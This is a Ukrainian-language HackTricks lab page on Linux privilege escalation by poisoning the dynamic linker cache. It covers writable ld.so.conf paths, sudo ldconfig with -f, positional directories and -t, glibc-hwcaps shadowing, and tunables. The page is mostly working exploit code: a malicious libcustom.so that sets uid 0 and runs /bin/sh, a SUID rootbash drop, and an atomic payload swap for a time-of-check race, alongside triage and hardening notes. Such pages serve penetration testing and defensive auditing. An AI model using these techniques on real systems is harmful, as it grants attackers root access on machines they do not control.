# Приклад privesc exploit для ld.so

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка присвячена лабораторній роботі з отруєння **кешу system linker через `/etc/ld.so.conf` або `ldconfig`**. Щодо ін'єкції відсутніх бібліотек, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` та іншого generic SUID linker abuse див. [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Підготовка середовища

У наступному розділі наведено код файлів, які ми використаємо для підготовки середовища

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Створіть** ці файли на своїй машині в одній папці
2. **Скомпілюйте** **бібліотеку**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Скопіюйте** `libcustom.so` до `/usr/lib` і оновіть кеш: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (привілеї root)
4. **Скомпілюйте** **виконуваний файл**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Перевірте середовище

Переконайтеся, що _libcustom.so_ **завантажується** з _/usr/lib_ і що ви можете **виконати** бінарний файл.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Корисні команди для triage

Під час атаки на реальну ціль перевірте **точну назву бібліотеки**, яка потрібна бінарному файлу, що **зараз визначає loader**, а також які налаштовані шляхи доступні для запису, не змінюючи активний cache.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Використовуйте `ldd` лише для **trusted** executable. Деякі реалізації або незвичні ELF interpreters можуть спричинити виконання code, контрольованого attacker; `objdump -p ./file | grep NEEDED` безпечно перелічує прямі dependencies. Для trusted target виклик виявленого interpreter з `--list` показує фактичне resolution. Порівняйте цей вивід із `--inhibit-cache --list`: різниця доводить, що саме `/etc/ld.so.cache`, а не звичайне правило search path, вибрало object.<sup>[[1]](#references)[[4]](#references)</sup>

Кілька корисних нюансів:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` зазвичай **не працює**, оскільки
перенаправлення виконується вашою поточною shell. Натомість використовуйте
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Бінарні файли **SUID/privileged** запускаються в **secure-execution mode**: `LD_LIBRARY_PATH`
ігнорується, а `LD_PRELOAD` обмежується (імена, що містять slash, ігноруються,
і попередньо завантажуватися можуть лише libraries із позначкою setuid у standard directories). Після того як root запустить `ldconfig`, directories, перелічені в
`/etc/ld.so.conf`, можуть потрапити до `/etc/ld.so.cache`, тому ця
misconfiguration все ще може впливати на privileged programs.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` також ігнорується в secure-execution mode, якщо не існує `/etc/suid-debug`, тому збирайте його trace під час еквівалентного non-SUID запуску, а не очікуйте виводу від privileged execution.<sup>[[1]](#references)</sup>
- У glibc 2.33 і новіших версіях dynamic loader також надає
`--list-diagnostics`, який виводить machine-readable diagnostics loader і
вбудовану інформацію про search path, коли hijack працює не так, як очікувалося.<sup>[[1]](#references)[[6]](#references)</sup>

### Обмеження cache і SONAME

`ldconfig` не кешує кожен довільний file у налаштованій directory: він перевіряє ELF headers, розпізнає імена, що відповідають `lib*.so*` або `ld-*.so*`, і очікує conventional chain `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Тому injected object повинен мати цільові architecture/class, точне ім’я `DT_NEEDED` (зазвичай його `DT_SONAME`) і всі symbols/versions, які victim resolves.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Надавайте перевагу бібліотеці, специфічній для цілі, як у цьому прикладі. Підміна поширеного SONAME неповним об'єктом може призвести до збою кожного процесу, який розв'язує його до запуску потрібної привілейованої цілі.<sup>[[3]](#references)</sup>

### Збереження шляху в кеші та атомарні підміни

Кеш зберігає зіставлення **назви бібліотеки зі шляхом**; він не вбудовує shared object. Після кешування шляху, контрольованого зловмисником, заміна об'єкта за цим точним шляхом впливає на нові запущені процеси без повторного запуску `ldconfig`. Це дає змогу використовувати корисний шаблон time-of-check/time-of-use: надати коректну бібліотеку під час перебудови або перевірки кешу адміністратором, а потім атомарно перейменувати payload поверх неї. Уже запущені процеси продовжують використовувати свій попередньо відображений об'єкт.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Так само, видалення шкідливого рядка з `ld.so.conf` саме по собі не видаляє вже записаний запис: адміністратор має видалити ненадійний об’єкт, виправити власника/права на запис і перебудувати cache. Скористайтеся наведеним вище порівнянням із `--inhibit-cache`, щоб відрізнити застарілий запис у cache від досі активного шляху конфігурації.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

У цьому сценарії припустімо, що адміністратор додав вразливий запис до
файлу в `/etc/ld.so.conf.d/`, який підключається системним
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Уразлива папка — _/home/ubuntu/lib_ (до якої ми маємо доступ на запис).\
**Завантажте та скомпілюйте** наведений нижче код у цій папці:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Якщо ви очікуєте, що пізніше **root** (або інший привілейований обліковий запис) виконає вразливий binary, зазвичай краще залишити **root-owned artifact**, а не запускати **interactive shell**. Наприклад:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Після виконання привілейованої операції можна використовувати `/tmp/rootbash -p`.

Тепер, коли ми **створили шкідливу бібліотеку libcustom у неправильно налаштованому** шляху, кеш за замовчуванням має бути перебудований успішним привілейованим запуском **`ldconfig`**. Перезавантаження допомагає лише тоді, коли локальний процес завантаження системи справді викликає його; в іншому разі дочекайтеся дії адміністратора або скористайтеся небезпечним правилом sudo, якщо воно доступне.<sup>[[2]](#references)</sup>

Після цього **повторно перевірте**, звідки виконуваний файл `sharedvuln` завантажує бібліотеку `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Як бачите, він **завантажує його з `/home/ubuntu/lib`**, і якщо будь-який користувач виконає його, буде запущено shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Зверніть увагу, що в цьому прикладі ми не підвищували привілеї, але, змінивши виконувані команди та **дочекавшись, поки root або інший привілейований користувач виконає вразливий бінарний файл**, ми зможемо підвищити привілеї.

### Затінення сучасного `glibc-hwcaps`

Починаючи з glibc 2.33, loader може надавати перевагу оптимізованим libraries у `glibc-hwcaps/<level>/` усередині **кожного каталогу пошуку libraries**. Отже, перевірки лише `/home/ubuntu/lib` недостатньо: доступний для запису сумісний підкаталог, такий як `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, може затінити базову library після того, як `ldconfig` проіндексує її, тоді як інші CPU продовжать використовувати базовий object. Це також забезпечує architecture-selective hijack, який можна пропустити, якщо validation виконується на іншому CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Поточні рекомендації з hardening glibc радять уникати дублікатів SONAME, нестандартних місць пошуку та об'єктів у підкаталогах `glibc-hwcaps`. З точки зору аудиту рекурсивно перевіряйте ownership і writeability налаштованих директорій та всіх компонентів їхніх батьківських шляхів.<sup>[[3]](#references)</sup>

### Інші misconfigurations - Та сама vuln

У попередньому прикладі ми штучно створили misconfiguration, за якої адміністратор **вказав non-privileged folder усередині configuration file у `/etc/ld.so.conf.d/`**.\
Але існують й інші misconfigurations, які можуть спричинити ту саму vulnerability: якщо у вас є **write permissions** до завантаженого **config file**, ви можете створити файл у writable директорії `/etc/ld.so.conf.d/` або записувати до `/etc/ld.so.conf`, то зможете налаштувати й експлуатувати ту саму vulnerability.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Припустімо, у вас є sudo privileges для `ldconfig`**. `ldconfig` приймає scan directories як positional arguments, тому найкоротша форма cache-poisoning часто виглядає просто так:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Як альтернатива, `-f` вибирає інший configuration file, зберігаючи стандартний cache output. Це корисно, коли фільтр аргументів блокує позиційні директорії, але все ще дозволяє `-f`, або коли потрібно інжектити кілька шляхів:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Тепер, як зазначено в **попередньому exploit**, **створіть malicious library всередині `/tmp`**.\
І нарешті, завантажимо шлях і перевіримо, звідки binary завантажує library:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Як бачите, маючи sudo-привілеї для `ldconfig`, можна скористатися тією самою вразливістю.** Деталі параметрів мають значення під час оцінювання обмеженого правила sudo: `-f` вибирає іншу конфігурацію, але все одно перебудовує `/etc/ld.so.cache`; `-C` перенаправляє кеш в інше місце; `-N` запобігає перебудові кешу; а `-X` запобігає оновленню посилань, але **все одно перебудовує кеш, якщо не використовується разом із `-N`**. `-n` передбачає `-N`, тому може оновлювати посилання в переданих каталогах, але не може отруїти кеш; `-r` працює в межах альтернативного кореня й зазвичай не змінює кеш хост-системи.<sup>[[2]](#references)</sup>

## glibc 2.44: кешовані системні параметри

Починаючи з glibc 2.44, `ldconfig` також аналізує `/etc/tunables.conf` і зберігає його налаштування як розширення в `/etc/ld.so.cache`. Файл підтримує директиви `include` та фільтри для окремих процесів. Префікси визначають область застосування: `@` націлений лише на процеси `AT_SECURE`, `$` виключає їх, а `*` охоплює обидві категорії. Це розширює межі аудиту за межі каталогів бібліотек: доступний для запису файл конфігурації tunables або підключений файл може впливати на майбутні запуски програм після привілейованої перебудови кешу.<sup>[[7]](#references)</sup>

У цьому ж випуску додано `ldconfig -t TUNCONF`, який вибирає альтернативний файл tunables, але все одно записує звичайний кеш, якщо інший параметр не змінює цю поведінку. Тому обгортки та правила sudo, які намагалися блокувати лише `-f`, також повинні відхиляти `-t`, довільні позиційні каталоги та маніпуляції з вихідним файлом кешу.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Це не означає автоматичного довільного виконання коду. Це привілейований примітив **loader-behavior manipulation**: glibc явно попереджає, що загальносистемні значення можуть застосовувати security-sensitive tunables до програм setuid/setgid без індивідуальної перевірки безпеки кожного tunable. Перелічіть фактичні tunables хоста за допомогою `--list-tunables` і шукайте цільові зміни allocator, зміни CPU-hardening або умови denial-of-service, а не припускайте наявність універсального payload.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Посилення захисту Dynamic Linker - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Сторінка посібника Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Діагностика Dynamic Linker (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Загальносистемні Tunables (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Додавання загальносистемних tunables: частина ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
